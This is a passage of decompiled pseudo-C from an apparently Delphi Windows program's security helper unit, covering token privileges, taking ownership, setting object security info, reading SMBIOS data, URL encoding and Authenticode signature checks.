  SECURITY_INFORMATION v11; // [esp-1Ch] [ebp-48h]
  PSID v12; // [esp-18h] [ebp-44h]
  PACL ExceptionList; // [esp-Ch] [ebp-38h] BYREF
  void *v14; // [esp-8h] [ebp-34h]
  int *v15; // [esp-4h] [ebp-30h]
  void *v16; // [esp+0h] [ebp-2Ch]
  void *v17; // [esp+4h] [ebp-28h] BYREF
  int v18; // [esp+8h] [ebp-24h] BYREF
  HANDLE handle; // [esp+Ch] [ebp-20h] BYREF
  int v20; // [esp+10h] [ebp-1Ch] BYREF
  SE_OBJECT_TYPE ObjectType; // [esp+14h] [ebp-18h] BYREF
  DWORD v22; // [esp+18h] [ebp-14h]
  char v23; // [esp+1Fh] [ebp-Dh]
  PSID psidOwner; // [esp+20h] [ebp-Ch]
  SECURITY_INFORMATION SecurityInfo; // [esp+24h] [ebp-8h]
  void (__fastcall ***v26)(_DWORD, HANDLE *, _DWORD *, PACL, SE_OBJECT_TYPE *); // [esp+28h] [ebp-4h]
  int savedregs; // [esp+2Ch] [ebp+0h] BYREF

  v18 = 0;
  v17 = 0;
  v20 = 0;
  psidOwner = a3;
  SecurityInfo = a2;
  v26 = a1;
  v15 = &savedregs;
  v14 = &loc_4500D2;
  ExceptionList = (PACL)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  v23 = 0;
  v6 = sub_406C44(&v20);
  (**v26)(v26, &handle, v6, ExceptionList, &ObjectType);
  if ( handle == (HANDLE)-1 )
  {
    if ( !v20 )
      goto LABEL_8;
    ExceptionList = pSacl;
    v12 = psidOwner;
    v11 = SecurityInfo;
    v10 = ObjectType;
    v8 = (WCHAR *)sub_407790(v20);
    v22 = SetNamedSecurityInfoW(v8, v10, v11, v12, psidGroup, pDacl, ExceptionList);
  }
  else
  {
    v22 = SetSecurityInfo(handle, ObjectType, SecurityInfo, psidOwner, psidGroup, pDacl, pSacl);
  }
  if ( v22 )
  {
    sub_415178((int *)&v17, 0, v7, v22);
    sub_407968(&v18, L"SetSecurityInfo error=", v17);
    sub_433BE0(*off_467F18, v18, (int)L"WinSecure:");
  }
  else
  {
    v23 = 1;
  }
LABEL_8:
  __writefsdword(0, (unsigned int)v14);
  v16 = &loc_4500D9;
  sub_406CA4((int)&v17, 2);
  sub_406C44(&v20);
  return v23;
}
// 450080: variable 'v7' is possibly undefined
// 4500F0: using guessed type wchar_t aSetsecurityinf[23];
// 45012C: using guessed type wchar_t aWinsecure_4[11];
// 467F18: using guessed type int *off_467F18;

//----- (00450150) --------------------------------------------------------
char __usercall sub_450150@<al>(
        void (__fastcall ***a1)(_DWORD, HANDLE *, _DWORD *, PACL, SE_OBJECT_TYPE *)@<eax>,
        int a2@<edx>,
        int a3@<edi>,
        int a4@<esi>,
        long double a5@<st0>)
{
  int v5; // edx
  HANDLE CurrentProcess; // eax
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-Ch] [ebp-1Ch] BYREF
  void *v9; // [esp-8h] [ebp-18h]
  int *v10; // [esp-4h] [ebp-14h]
  _DWORD *v11; // [esp+0h] [ebp-10h]
  char v12; // [esp+7h] [ebp-9h]
  int v13; // [esp+8h] [ebp-8h]
  void (__fastcall ***v14)(_DWORD, HANDLE *, _DWORD *, PACL, SE_OBJECT_TYPE *); // [esp+Ch] [ebp-4h]
  int savedregs; // [esp+10h] [ebp+0h] BYREF

  v13 = a2;
  v14 = a1;
  v12 = 0;
  if ( sub_44F140(a2) )
  {
    LOBYTE(v5) = 1;
    v11 = (_DWORD *)Qcomctrls::TTab::TTab(&cls_WinSecureUtil_TWinSecurityToken, v5);
    v10 = &savedregs;
    v9 = &loc_450220;
    ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
    __writefsdword(0, (unsigned int)&ExceptionList);
    CurrentProcess = GetCurrentProcess();
    if ( sub_450510((int)v11, CurrentProcess, 0x20u, a3, a4, a5, 0)
      && sub_4506A0((int)v11, (int)L"SeTakeOwnershipPrivilege", 1, a3, a4, a5)
      && sub_44FFD0(v14, 1u, *(void **)(v13 + 4), 0, 0, 0)
      && sub_4506A0((int)v11, (int)L"SeTakeOwnershipPrivilege", 0, a3, a4, a5) )
    {
      v12 = 1;
      __writefsdword(0, (unsigned int)ExceptionList);
      v10 = (int *)&loc_450227;
      sub_405598(v11);
    }
    else
    {
      System::__linkproc__ TryFinallyExit(ExceptionList, v9, v10);
    }
  }
  return v12;
}
// 450177: variable 'v5' is possibly undefined
// 406434: using guessed type _DWORD __stdcall System::__linkproc__ TryFinallyExit(_DWORD, _DWORD, _DWORD);
// 44E4BC: using guessed type __int16 cls_WinSecureUtil_TWinSecurityToken;
// 45023C: using guessed type wchar_t aSetakeownershi[25];
// 450270: using guessed type int __fastcall Qcomctrls::TTab::TTab(_DWORD, _DWORD);

//----- (004502C0) --------------------------------------------------------
int sub_4502C0()
{
  __int64 v0; // rax
  int result; // eax
  char v2; // [esp+3h] [ebp-5h]
  int v3; // [esp+4h] [ebp-4h]

  v0 = System::__linkproc__ BeforeDestruction();
  v2 = BYTE4(v0);
  v3 = v0;
  sub_405588();
  result = v3;
  if ( *(_DWORD *)(v3 + 4) != -1 )
  {
    CloseHandle_0(*(HANDLE *)(v3 + 4));
    result = v3;
    *(_DWORD *)(v3 + 4) = -1;
  }
  if ( v2 > 0 )
    return System::__linkproc__ ClassDestroy(v3);
  return result;
}
// 4058C4: using guessed type int __fastcall System::__linkproc__ ClassDestroy(_DWORD);

//----- (004503E0) --------------------------------------------------------
int __usercall sub_4503E0@<eax>(int a1@<eax>, char a2@<dl>, int a3@<edi>, int a4@<esi>, long double a5@<st0>)
{
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-Ch] [ebp-20h] BYREF
  void *v7; // [esp-8h] [ebp-1Ch]
  int *v8; // [esp-4h] [ebp-18h]
  int v9; // [esp+0h] [ebp-14h]
  DWORD ReturnLength; // [esp+4h] [ebp-10h] BYREF
  int v11; // [esp+8h] [ebp-Ch]
  char v12; // [esp+Fh] [ebp-5h]
  int v13; // [esp+10h] [ebp-4h]
  int savedregs; // [esp+14h] [ebp+0h] BYREF

  v12 = a2;
  v13 = a1;
  v11 = 0;
  if ( *(_DWORD *)(a1 + 4) != -1 )
  {
    ReturnLength = 0;
    if ( !(unsigned __int8)sub_450310(1, &ReturnLength, 0) && GetLastError_1() == 122 )
    {
      if ( ReturnLength >= 8 )
      {
        v9 = System::AllocMem(ReturnLength);
        v8 = &savedregs;
        v7 = &loc_4504A9;
        ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
        __writefsdword(0, (unsigned int)&ExceptionList);
        if ( (unsigned __int8)sub_450310(v12, &ReturnLength, ReturnLength) )
        {
          v11 = v9;
          v9 = 0;
          __writefsdword(0, (unsigned int)ExceptionList);
          v8 = (int *)&loc_4504B0;
          System::__linkproc__ FreeMem(0);
        }
        else
        {
          System::__linkproc__ TryFinallyExit(ExceptionList, v7, v8);
        }
      }
    }
    else
    {
      sub_433940(*off_467F18, L"GetTokenInformation", (int)L"WinSecure:", a3, a4, a5, 0);
    }
  }
  return v11;
}
// 404DB0: using guessed type int __fastcall System::__linkproc__ FreeMem(_DWORD);
// 406434: using guessed type _DWORD __stdcall System::__linkproc__ TryFinallyExit(_DWORD, _DWORD, _DWORD);
// 4504C4: using guessed type wchar_t aWinsecure_6[11];
// 4504E8: using guessed type wchar_t aGettokeninform_0[20];
// 467F18: using guessed type int *off_467F18;

//----- (00450510) --------------------------------------------------------
char __userpurge sub_450510@<al>(
        int a1@<eax>,
        void *a2@<edx>,
        DWORD a3@<ecx>,
        int a4@<edi>,
        int a5@<esi>,
        long double a6@<st0>,
        char a7)
{
  char v8; // [esp+3h] [ebp-Dh]

  v8 = 0;
  if ( *(_DWORD *)(a1 + 4) == -1 )
  {
    if ( OpenProcessToken(a2, a3, (PHANDLE)(a1 + 4)) )
    {
      return 1;
    }
    else
    {
      *(_DWORD *)(a1 + 4) = -1;
      if ( !a7 )
        sub_433940(*off_467F18, L"OpenProcessToken", (int)L"WinSecure:", a4, a5, a6, 0);
    }
  }
  return v8;
}
// 450588: using guessed type wchar_t aWinsecure_7[11];
// 4505AC: using guessed type wchar_t aOpenprocesstok[17];
// 467F18: using guessed type int *off_467F18;

//----- (004505D0) --------------------------------------------------------
char __userpurge sub_4505D0@<al>(
        int a1@<eax>,
        void *a2@<edx>,
        DWORD a3@<ecx>,
        int a4@<edi>,
        int a5@<esi>,
        long double a6@<st0>,
        char a7,
        char a8)
{
  char v9; // [esp+3h] [ebp-Dh]

  v9 = 0;
  if ( *(_DWORD *)(a1 + 4) == -1 )
  {
    if ( OpenThreadToken(a2, a3, -(a8 != 0), (PHANDLE)(a1 + 4)) )
    {
      return 1;
    }
    else
    {
      *(_DWORD *)(a1 + 4) = -1;
      if ( !a7 )
        sub_433940(*off_467F18, L"OpenThreadToken", (int)L"WinSecure:", a4, a5, a6, 0);
    }
  }
  return v9;
}
// 450650: using guessed type wchar_t aWinsecure_8[11];
// 450674: using guessed type wchar_t aOpenthreadtoke[16];
// 467F18: using guessed type int *off_467F18;

//----- (004506A0) --------------------------------------------------------
char __usercall sub_4506A0@<al>(
        int a1@<eax>,
        int a2@<edx>,
        char a3@<cl>,
        int a4@<edi>,
        int a5@<esi>,
        long double a6@<st0>)
{
  const WCHAR *v6; // eax
  struct _TOKEN_PRIVILEGES NewState; // [esp+0h] [ebp-20h] BYREF
  DWORD ReturnLength; // [esp+10h] [ebp-10h] BYREF
  char v10; // [esp+16h] [ebp-Ah]
  char v11; // [esp+17h] [ebp-9h]
  int v12; // [esp+18h] [ebp-8h]
  int v13; // [esp+1Ch] [ebp-4h]

  v11 = a3;
  v12 = a2;
  v13 = a1;
  v10 = 0;
  if ( *(_DWORD *)(a1 + 4) != -1 )
  {
    NewState.PrivilegeCount = 1;
    v6 = (const WCHAR *)sub_407790(v12);
    if ( LookupPrivilegeValueW(0, v6, &NewState.Privileges[0].Luid) )
    {
      if ( v11 )
        NewState.Privileges[0].Attributes = 2;
      else
        NewState.Privileges[0].Attributes = 0;
      ReturnLength = 0;
      if ( AdjustTokenPrivileges(*(HANDLE *)(v13 + 4), 0, &NewState, 0x10u, 0, &ReturnLength) )
      {
        ReturnLength = GetLastError_1();
        if ( ReturnLength )
          sub_433830(*off_467F18, 2, ReturnLength, (int)L"WinSecure: AdjustTokenPrivileges:");
        else
          return 1;
      }
      else
      {
        sub_433940(*off_467F18, L"AdjustTokenPrivileges", (int)L"WinSecure:", a4, a5, a6, 0);
      }
    }
    else
    {
      sub_433940(*off_467F18, L"LookupPrivilegeValueW", (int)L"WinSecure:", a4, a5, a6, 0);
    }
  }
  return v10;
}
// 450788: using guessed type wchar_t aWinsecure_9[11];
// 4507AC: using guessed type wchar_t aLookupprivileg[22];
// 4507E4: using guessed type wchar_t aAdjusttokenpri[22];
// 45081C: using guessed type wchar_t aWinsecureAdjus[34];
// 467F18: using guessed type int *off_467F18;

//----- (00450860) --------------------------------------------------------
int __fastcall sub_450860(int a1, _DWORD *a2, volatile __int32 *a3)
{
  sub_406C44(a3);
  sub_44E9F0(a3, a2, 1, L"FILE_READ_DATA");
  sub_44E9F0(a3, a2, 2, L"FILE_WRITE_DATA");
  sub_44E9F0(a3, a2, 4, L"FILE_APPEND_DATA");
  sub_44E9F0(a3, a2, 8, L"FILE_READ_EA");
  sub_44E9F0(a3, a2, 16, L"FILE_WRITE_EA");
  sub_44E9F0(a3, a2, 32, L"FILE_EXECUTE");
  sub_44E9F0(a3, a2, 64, L"FILE_DELETE_CHILD");
  sub_44E9F0(a3, a2, 128, L"FILE_READ_ATTRIBUTES");
  return sub_44E9F0(a3, a2, 256, L"FILE_WRITE_ATTRIBUTES");
}
// 450944: using guessed type wchar_t aFileReadData[15];
// 450970: using guessed type wchar_t aFileWriteData[16];
// 45099C: using guessed type wchar_t aFileAppendData[17];
// 4509CC: using guessed type wchar_t aFileReadEa[13];
// 4509F4: using guessed type wchar_t aFileWriteEa[14];
// 450A1C: using guessed type wchar_t aFileExecute[13];
// 450A44: using guessed type wchar_t aFileDeleteChil[18];
// 450A74: using guessed type wchar_t aFileReadAttrib[21];
// 450AAC: using guessed type wchar_t aFileWriteAttri[22];

//----- (00450C40) --------------------------------------------------------
char __fastcall sub_450C40(int a1)
{
  char result; // al

  nullsub_2(a1);
  *(_DWORD *)(a1 + 12) = sub_405568((int)&cls_CrossPlatform_TMemoryStream, 1);
  result = sub_450D20(a1);
  if ( result )
    return sub_450E60(a1);
  return result;
}
// 405840: using guessed type int __fastcall nullsub_2(_DWORD);
// 4227A8: using guessed type int (*cls_CrossPlatform_TMemoryStream)();

//----- (00450C80) --------------------------------------------------------
int __fastcall sub_450C80(int a1)
{
  unknown_libname_94(a1 + 12);
  return nullsub_3(a1);
}
// 405844: using guessed type int __fastcall nullsub_3(_DWORD);
// 41C304: using guessed type int __fastcall unknown_libname_94(_DWORD);

//----- (00450CA0) --------------------------------------------------------
int __fastcall sub_450CA0(int a1, char a2, int a3)
{
  int v4; // [esp+0h] [ebp-18h]
  int v5; // [esp+4h] [ebp-14h]
  int v6; // [esp+8h] [ebp-10h]

  v6 = 0;
  if ( *(_BYTE *)(a1 + 20) )
  {
    v4 = *(_DWORD *)(a1 + 16);
    v5 = 8 * System::__linkproc__ LStrLen(v4) + v4;
    if ( v4 != v5 )
    {
      while ( a2 != **(_BYTE **)v4 )
      {
        v4 += 8;
        if ( v4 == v5 )
          return v6;
      }
      if ( *(unsigned __int8 *)(*(_DWORD *)v4 + 1) >= a3 )
        return v4;
    }
  }
  return v6;
}
// 408670: using guessed type int __fastcall System::__linkproc__ LStrLen(_DWORD);

//----- (00450D20) --------------------------------------------------------
char __fastcall sub_450D20(int a1)
{
  int v1; // eax
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-Ch] [ebp-24h] BYREF
  void *v4; // [esp-8h] [ebp-20h]
  int *v5; // [esp-4h] [ebp-1Ch]
  void *Mem; // [esp+4h] [ebp-14h]
  unsigned int v7; // [esp+8h] [ebp-10h]
  unsigned int v8; // [esp+Ch] [ebp-Ch]
  char v9; // [esp+13h] [ebp-5h]
  int v10; // [esp+14h] [ebp-4h]
  int savedregs; // [esp+18h] [ebp+0h] BYREF

  v10 = a1;
  v9 = 0;
  if ( *off_467FBC )
  {
    v8 = 0;
    v8 = ((int (__stdcall *)(int, _DWORD, _DWORD, _DWORD))*off_467FBC)(1381190978, 0, 0, 0);
    if ( v8 > 8 )
    {
      Mem = (void *)System::__linkproc__ GetMem(v8);
      v5 = &savedregs;
      v4 = &loc_450DFB;
      ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
      __writefsdword(0, (unsigned int)&ExceptionList);
      v8 = ((int (__stdcall *)(int, _DWORD, void *, unsigned int))*off_467FBC)(1381190978, 0, Mem, v8);
      if ( v8 > 8
        && (v7 = v8 - 8,
            System::Move(Mem, (void *)(v10 + 4), 8),
            v1 = (*(int (__fastcall **)(_DWORD, char *, unsigned int))(**(_DWORD **)(v10 + 12) + 16))(
                   *(_DWORD *)(v10 + 12),
                   (char *)Mem + 8,
                   v7),
            v1 == v7) )
      {
        v9 = 1;
        __writefsdword(0, (unsigned int)ExceptionList);
        v5 = (int *)&loc_450E02;
        System::__linkproc__ FreeMem(Mem);
      }
      else
      {
        System::__linkproc__ TryFinallyExit(ExceptionList, v4, v5);
      }
    }
  }
  return v9;
}
// 404D94: using guessed type int __fastcall System::__linkproc__ GetMem(_DWORD);
// 404DB0: using guessed type int __fastcall System::__linkproc__ FreeMem(_DWORD);
// 406434: using guessed type _DWORD __stdcall System::__linkproc__ TryFinallyExit(_DWORD, _DWORD, _DWORD);
// 467FBC: using guessed type int *off_467FBC;

//----- (00450E10) --------------------------------------------------------
int __cdecl sub_450E10(int a1)
{
  int result; // eax
  int v2; // [esp+0h] [ebp-4h]

  v2 = System::__linkproc__ LStrLen(*(_DWORD *)(a1 - 4));
  System::__linkproc__ DynArraySetLength(v2 + 1);
  result = *(_DWORD *)(a1 - 4);
  *(_DWORD *)(result + 4 * v2) = *(_DWORD *)(a1 - 12);
  return result;
}
// 408670: using guessed type int __fastcall System::__linkproc__ LStrLen(_DWORD);
// 408A10: using guessed type int __cdecl System::__linkproc__ DynArraySetLength(_DWORD);

//----- (00450E60) --------------------------------------------------------
int __fastcall sub_450E60(int a1)
{
  unsigned int v2[2]; // [esp-Ch] [ebp-2Ch] BYREF
  int *v3; // [esp-4h] [ebp-24h]
  int v4; // [esp+0h] [ebp-20h]
  int v5; // [esp+4h] [ebp-1Ch]
  int v6; // [esp+8h] [ebp-18h]
  int v7; // [esp+Ch] [ebp-14h]
  int v8; // [esp+10h] [ebp-10h]
  int v9; // [esp+14h] [ebp-Ch]
  _BYTE *v10; // [esp+18h] [ebp-8h] BYREF
  int v11; // [esp+1Ch] [ebp-4h] BYREF
  int savedregs; // [esp+20h] [ebp+0h] BYREF

  v8 = a1;
  sub_407D10((int)&v10, (int)&byte_450B18);
  v3 = &savedregs;
  v2[1] = (unsigned int)&loc_450FE6;
  v2[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v2);
  if ( *(_BYTE *)(v8 + 5) >= 2u )
  {
    v5 = 0;
    System::__linkproc__ DynArraySetLength(0);
    v7 = 0;
    v4 = *(_DWORD *)(*(_DWORD *)(v8 + 12) + 4);
    v6 = (***(int (__fastcall ****)(_DWORD))(v8 + 12))(*(_DWORD *)(v8 + 12));
    while ( v7 + 4 <= v6 )
    {
      v10 = (_BYTE *)(v7 + v4);
      sub_408B34(&v11, (int)dword_450ADC);
      if ( v7 + (unsigned __int8)v10[1] + 2 > v6 )
        break;
      v7 += (unsigned __int8)v10[1];
      v9 = v7 + v4;
      while ( *(_BYTE *)(v4 + v7) || *(_BYTE *)(v4 + v7 + 1) )
      {
        if ( ++v7 + 2 > v6 )
          goto LABEL_13;
        if ( !*(_BYTE *)(v4 + v7 - 1) )
        {
          sub_450E10((int)&savedregs);
          v9 = v7 + v4;
        }
      }
      v7 += 2;
      sub_450E10((int)&savedregs);
      System::__linkproc__ DynArraySetLength(v5 + 1);
      sub_407F98(*(_DWORD *)(v8 + 16) + 8 * v5++, (int)&v10, (int)&byte_450B18);
      if ( *v10 == 127 )
      {
        *(_BYTE *)(v8 + 20) = 1;
        break;
      }
    }
  }
LABEL_13:
  __writefsdword(0, v2[0]);
  v3 = (int *)&loc_450FED;
  return sub_407DEC((int)&v10, (int)&byte_450B18);
}
// 408A10: using guessed type int __cdecl System::__linkproc__ DynArraySetLength(_DWORD);
// 450ADC: using guessed type int dword_450ADC[5];
// 450B18: using guessed type char byte_450B18;

//----- (00451000) --------------------------------------------------------
_DWORD *__fastcall sub_451000(int a1, _DWORD *a2)
{
  return sub_451040(a1, &dword_451020, a2);
}
// 451020: using guessed type int dword_451020;

//----- (00451040) --------------------------------------------------------
_DWORD *__fastcall sub_451040(int a1, const signed __int32 *a2, _DWORD *a3)
{
  int v3; // eax
  int v4; // eax
  int v5; // eax
  int v6; // eax
  int v7; // eax
  int v8; // eax
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-Ch] [ebp-38h] BYREF
  void *v11; // [esp-8h] [ebp-34h]
  int *v12; // [esp-4h] [ebp-30h]
  void *v13; // [esp+0h] [ebp-2Ch]
  const WCHAR *v14; // [esp+4h] [ebp-28h] BYREF
  int v15; // [esp+8h] [ebp-24h]
  CHAR *v16; // [esp+Ch] [ebp-20h] BYREF
  int i; // [esp+10h] [ebp-1Ch]
  int v18; // [esp+14h] [ebp-18h]
  int v19; // [esp+18h] [ebp-14h]
  int v20; // [esp+1Ch] [ebp-10h]
  int v21; // [esp+20h] [ebp-Ch]
  const signed __int32 *v22; // [esp+24h] [ebp-8h]
  int v23; // [esp+28h] [ebp-4h]
  int savedregs; // [esp+2Ch] [ebp+0h] BYREF

  v14 = 0;
  v16 = 0;
  v21 = (int)a3;
  v22 = a2;
  v23 = a1;
  v12 = &savedregs;
  v11 = &loc_4511B2;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  sub_406C68(a3);
  v3 = System::__linkproc__ LStrLen(v23);
  sub_4075BC((_DWORD *)v21, v3, 0);
  v19 = 0;
  v4 = System::__linkproc__ LStrLen(v23);
  if ( v4 > 0 )
  {
    v15 = v4;
    v20 = 1;
    do
    {
      if ( sub_414B20(*(_BYTE *)(v23 + v20 - 1), v22) || *(char *)(v23 + v20 - 1) <= 32 )
      {
        sub_4154B0(*(unsigned __int8 *)(v23 + v20 - 1), 2, (int *)&v14);
        sub_407634(&v16, v14, 0, (unsigned __int16)ExceptionList);
        ++v19;
        v5 = sub_4071C8(v21);
        *(_BYTE *)(v5 + v19 - 1) = 37;
        v18 = System::__linkproc__ LStrLen(v16);
        v6 = System::__linkproc__ LStrLen(*(_DWORD *)v21);
        sub_4075BC((_DWORD *)v21, v18 + v6, 0);
        for ( i = 1; i <= v18; ++i )
        {
          ++v19;
          v7 = sub_4071C8(v21);
          *(_BYTE *)(v7 + v19 - 1) = v16[i - 1];
        }
      }
      else
      {
        ++v19;
        v8 = sub_4071C8(v21);
        *(_BYTE *)(v8 + v19 - 1) = *(_BYTE *)(v23 + v20 - 1);
      }
      ++v20;
      --v15;
    }
    while ( v15 );
  }
  __writefsdword(0, (unsigned int)v11);
  v13 = &loc_4511B9;
  sub_406C44(&v14);
  return sub_406C68(&v16);
}
// 407104: using guessed type int __fastcall System::__linkproc__ LStrLen(_DWORD);
// 4071C8: using guessed type int __fastcall sub_4071C8(_DWORD);

//----- (00451240) --------------------------------------------------------
LONG __fastcall sub_451240(int a1)
{
  int v2[4]; // [esp+0h] [ebp-48h] BYREF
  int pWVTData[12]; // [esp+10h] [ebp-38h] BYREF
  int v4; // [esp+44h] [ebp-4h]

  v4 = a1;
  sub_40C8D0(v2, 16);
  sub_40C8D0(pWVTData, 48);
  v2[0] = 16;
  v2[1] = sub_407790(v4);
  v2[3] = 0;
  v2[2] = 0;
  pWVTData[0] = 48;
  pWVTData[5] = 1;
  pWVTData[6] = (int)v2;
  pWVTData[3] = 2;
  pWVTData[4] = 0;
  memset(&pWVTData[7], 0, 12);
  pWVTData[10] = 256;
  return WinVerifyTrust(HWND_MESSAGE|0x2, &pgActionID, pWVTData);
}

//----- (004512D0) --------------------------------------------------------
int __fastcall sub_4512D0(int a1, _DWORD *a2)
{
  const void *v2; // eax
  int result; // eax
  unsigned int v4[2]; // [esp-30h] [ebp-C8h] BYREF
  void **v5; // [esp-28h] [ebp-C0h]
  struct _EXCEPTION_REGISTRATION_RECORD *v6; // [esp-24h] [ebp-BCh] BYREF
  void *v7; // [esp-20h] [ebp-B8h]
  void **v8; // [esp-1Ch] [ebp-B4h]
  struct _EXCEPTION_REGISTRATION_RECORD *v9; // [esp-18h] [ebp-B0h] BYREF
  void *v10; // [esp-14h] [ebp-ACh]
  void **v11; // [esp-10h] [ebp-A8h]
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-Ch] [ebp-A4h] BYREF
  void *v13; // [esp-8h] [ebp-A0h]
  void **v14; // [esp-4h] [ebp-9Ch]
  char pvFindPara[4]; // [esp+0h] [ebp-98h] BYREF
  int v16; // [esp+4h] [ebp-94h]
  int v17; // [esp+8h] [ebp-90h]
  int v18; // [esp+18h] [ebp-80h]
  int v19; // [esp+1Ch] [ebp-7Ch]
  PCCERT_CONTEXT pCertContext; // [esp+70h] [ebp-28h]
  LPWSTR pszNameString; // [esp+74h] [ebp-24h]
  DWORD NameStringW; // [esp+78h] [ebp-20h]
  DWORD cchNameString; // [esp+7Ch] [ebp-1Ch]
  void *pvData; // [esp+80h] [ebp-18h]
  DWORD pcbData; // [esp+84h] [ebp-14h] BYREF
  HCRYPTMSG phMsg; // [esp+88h] [ebp-10h] BYREF
  HCERTSTORE phCertStore; // [esp+8Ch] [ebp-Ch] BYREF
  _DWORD *v28; // [esp+90h] [ebp-8h]
  int v29; // [esp+94h] [ebp-4h]
  void *savedregs; // [esp+98h] [ebp+0h] BYREF

  v28 = a2;
  v29 = a1;
  sub_406C44(a2);
  v2 = (const void *)sub_407790(v29);
  result = CryptQueryObject(1u, v2, 0x400u, 2u, 0, 0, 0, 0, &phCertStore, &phMsg, 0);
  if ( result )
  {
    v14 = &savedregs;
    v13 = &loc_4514E4;
    ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
    __writefsdword(0, (unsigned int)&ExceptionList);
    pcbData = 0;
    if ( CryptMsgGetParam(phMsg, 6u, 0, 0, &pcbData) )
    {
      pvData = (void *)System::__linkproc__ GetMem(pcbData);
      v11 = &savedregs;
      v10 = &loc_4514AF;
      v9 = NtCurrentTeb()->NtTib.ExceptionList;
      __writefsdword(0, (unsigned int)&v9);
      if ( CryptMsgGetParam(phMsg, 6u, 0, pvData, &pcbData) )
      {
        v18 = *((_DWORD *)pvData + 1);
        v19 = *((_DWORD *)pvData + 2);
        v16 = *((_DWORD *)pvData + 3);
        v17 = *((_DWORD *)pvData + 4);
        pCertContext = CertFindCertificateInStore(phCertStore, 0x10001u, 0, 0xB0000u, pvFindPara, 0);
        v8 = &savedregs;
        v7 = &loc_451492;
        v6 = NtCurrentTeb()->NtTib.ExceptionList;
        __writefsdword(0, (unsigned int)&v6);
        cchNameString = CertGetNameStringW(pCertContext, 4u, 0, 0, 0, 0);
        if ( cchNameString )
        {
          pszNameString = (LPWSTR)System::__linkproc__ GetMem(2 * cchNameString);
          v5 = &savedregs;
          v4[1] = (unsigned int)&loc_45146E;
          v4[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
          __writefsdword(0, (unsigned int)v4);
          NameStringW = CertGetNameStringW(pCertContext, 4u, 0, 0, pszNameString, cchNameString);
          if ( NameStringW == cchNameString )
            unknown_libname_50(v28, pszNameString);
          __writefsdword(0, v4[0]);
          v5 = (void **)&loc_451475;
          System::__linkproc__ FreeMem(pszNameString);
          __writefsdword(0, (unsigned int)v28);
          savedregs = &loc_451499;
          if ( pCertContext )
            CertFreeCertificateContext(pCertContext);
          __writefsdword(0, (unsigned int)v28);
          savedregs = &loc_4514B6;
          System::__linkproc__ FreeMem(pvData);
          result = 0;
          __writefsdword(0, (unsigned int)v28);
          savedregs = &loc_4514EB;
          if ( phCertStore )
            result = CertCloseStore(phCertStore, 0);
          if ( phMsg )
            return CryptMsgClose(phMsg);
        }
        else
        {
          System::__linkproc__ TryFinallyExit(v6, v7, v8);
          System::__linkproc__ TryFinallyExit(v9, v10, v11);
          return System::__linkproc__ TryFinallyExit(ExceptionList, v13, v14);
        }
      }
      else
      {
        System::__linkproc__ TryFinallyExit(v9, v10, v11);
        return System::__linkproc__ TryFinallyExit(ExceptionList, v13, v14);
      }
    }
    else
    {
      return System::__linkproc__ TryFinallyExit(ExceptionList, v13, v14);
    }
  }
  return result;
}
// 404D94: using guessed type int __fastcall System::__linkproc__ GetMem(_DWORD);
// 404DB0: using guessed type int __fastcall System::__linkproc__ FreeMem(_DWORD);
// 406434: using guessed type _DWORD __stdcall System::__linkproc__ TryFinallyExit(_DWORD, _DWORD, _DWORD);
// 4077E8: using guessed type int __fastcall unknown_libname_50(_DWORD, _DWORD);
// 4512D0: using guessed type char pvFindPara[4];

//----- (00451510) --------------------------------------------------------
_DWORD *__fastcall sub_451510(unsigned __int8 a1, int *a2)
{
  _DWORD v4[5]; // [esp-14h] [ebp-18h] BYREF
  int v5; // [esp+0h] [ebp-4h] BYREF
  int savedregs; // [esp+4h] [ebp+0h] BYREF

  v5 = 0;
  v4[2] = &savedregs;
  v4[1] = &loc_451563;
  v4[0] = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v4);
  sub_415150(a1, &v5);
  sub_4079F0(a2, 3);
  __writefsdword(0, (unsigned int)&dword_45158C);
  return sub_406C44(&v5);
}
// 45158C: using guessed type int dword_45158C;

//----- (00451590) --------------------------------------------------------
_DWORD *__fastcall sub_451590(unsigned __int8 a1, unsigned __int8 a2, volatile __int32 *a3)
{
  int v5; // edi
  unsigned int v7[2]; // [esp-Ch] [ebp-20h] BYREF
  int *v8; // [esp-4h] [ebp-18h]
  int v9; // [esp+Ch] [ebp-8h] BYREF
  unsigned __int8 v10; // [esp+13h] [ebp-1h]
  int savedregs; // [esp+14h] [ebp+0h] BYREF

  v9 = 0;
  v10 = a2;
  v8 = &savedregs;
  v7[1] = (unsigned int)&loc_451674;
  v7[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v7);
  v5 = a1 & 0x7F;
  sub_406FE8(a3, (int)off_4681B0[46 * a2 + v5]);
  if ( !*a3 )
  {
    if ( off_4681B0[v5 + 46] )
    {
      sub_406FE8(a3, (int)off_4681B0[v5 + 46]);
    }
    else if ( off_4681B0[v5] )
    {
      sub_406FE8(a3, (int)off_4681B0[v5]);
    }
    else
    {
      sub_451510(a1, &v9);
      sub_4079F0((int *)a3, 3);
    }
  }
  sub_406FE8(&dword_46EEB0[46 * v10 + v5], *a3);
  __writefsdword(0, v7[0]);
  v8 = (int *)&loc_45167B;
  return sub_406C44(&v9);
}
// 4681B0: using guessed type int (**off_4681B0)[10];
// 46EEB0: using guessed type _DWORD dword_46EEB0[506];
// 451590: using guessed type int var_8;

//----- (004516A0) --------------------------------------------------------
volatile __int32 *__fastcall sub_4516A0(unsigned __int8 a1, volatile __int32 *a2)
{
  volatile __int32 *result; // eax

  result = sub_406FE8(a2, dword_46EEB0[46 * (unsigned __int8)byte_46EEAC + a1]);
  if ( !*a2 )
    return sub_451590(a1, byte_46EEAC, a2);
